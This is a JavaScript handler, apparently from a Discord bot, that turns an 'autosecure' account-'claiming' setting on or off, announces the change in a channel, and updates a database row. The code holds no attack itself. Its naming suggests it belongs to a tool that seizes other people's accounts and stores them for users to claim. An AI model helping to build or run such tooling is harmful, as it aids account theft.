const listSettings = require("../../utils/settings/listSettings")

module.exports = {
    name: "settingsclaiming",
    editsettings: true,
    callback: async (client, interaction) => {
        let [t, claiming] = interaction.customId.split("|")
        claiming = parseInt(claiming)

        if (isNaN(claiming) || (claiming !== 0 && claiming !== 1)) {
            return interaction.reply({ content: "Invalid value for claiming.", ephemeral: true })
        }

        const [settings] = await client.queryParams(
            `SELECT * FROM autosecure WHERE user_id = ?`,
            [client.username]
        )

        let nChannelId, nGuildId, rChannelId, rGuildId

        if (settings?.notification_channel) {
            [nChannelId, nGuildId] = settings.notification_channel.split("|")
        }

        if (settings?.users_channel) {
            [rChannelId, rGuildId] = settings.users_channel.split("|")
        }

        const message = claiming
            ? "Claiming has been enabled!"
            : "Claiming has been disabled!"

        try {
            if (rChannelId) {
                const rChannel = await client.channels.fetch(rChannelId)
                if (rChannel?.send) await rChannel.send(message)
            } else if (nChannelId) {
                const nChannel = await client.channels.fetch(nChannelId)
                if (nChannel?.send) await nChannel.send(message)
            }
        } catch (err) {
            console.error("Failed to send claiming message:", err)
        }

        await client.queryParams(
            `UPDATE autosecure SET claiming = ? WHERE user_id = ?`,
            [claiming, client.username]
        )

        let msg = await listSettings(client, client.username, false)
        msg.content = claiming
            ? `Users can now claim and accounts will be stored to be claimed!`
            : `Users cannot claim accounts anymore and accounts won't be stored to be claimed!`
        await interaction.update(msg)
    }
}
